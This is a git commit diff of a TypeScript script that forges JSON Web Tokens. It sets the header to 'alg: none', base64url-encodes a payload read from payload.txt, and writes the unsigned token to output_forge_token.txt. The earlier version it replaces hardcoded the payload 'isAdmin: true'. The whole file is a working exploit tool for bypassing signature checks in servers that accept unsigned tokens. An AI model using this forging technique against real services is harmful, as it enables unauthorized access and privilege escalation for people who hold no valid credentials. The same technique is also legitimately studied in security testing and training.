998d9e909c471fc827d150cb75beafa46d5c3717
U82146510 <U82146510@protonmail.com>
2025-05-05 08:53:56 +0100

    first comit in head branch

--- app.ts
+++ app.ts
@@ -4,12 +4,14 @@ import path from 'path';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
+const file_input = path.join(__dirname,'payload.txt');
+const file_output = path.join(__dirname,'output_forge_token.txt');
 
-const input_payload:string = fs.readFileSync("payload.txt","utf-8");
+const input_payload:string = fs.readFileSync(file_input,"utf-8");
 
-function base64(input:unknown):string|undefined{
+function base64(input:string):string|undefined{
     try {
-        const buffer = Buffer.from(JSON.stringify(input))
+        const buffer = Buffer.from(input)
         .toString("base64")
         .replace(/=/g, "")
         .replace(/\+/g, "-")
@@ -22,25 +24,26 @@ function base64(input:unknown):string|undefined{
 
 
 
-const head:{alg:'none',typ:'JWT'}={
+const head:{
+    alg:'none',
+    typ:'JWT'
+}=
+{ 
     alg:'none',
     typ:'JWT',
 };
 
-const payload={
-    isAdmin:true,
-};
 
 
 const get_token = ():void=>{
     try {
-        const encode_head = base64(head);
-        const encode_payload = base64(payload);
+        const encode_head = base64(JSON.stringify(head));
+        const encode_payload = base64(input_payload);
         const token = `${encode_head}.${encode_payload}.`;
-        fs.writeFileSync('output_forge_token.txt',token);
+        fs.writeFileSync(file_output,token);
     } catch (error) {
         console.error(error);
     }
 };
 
-console.log(get_token())
+get_token()
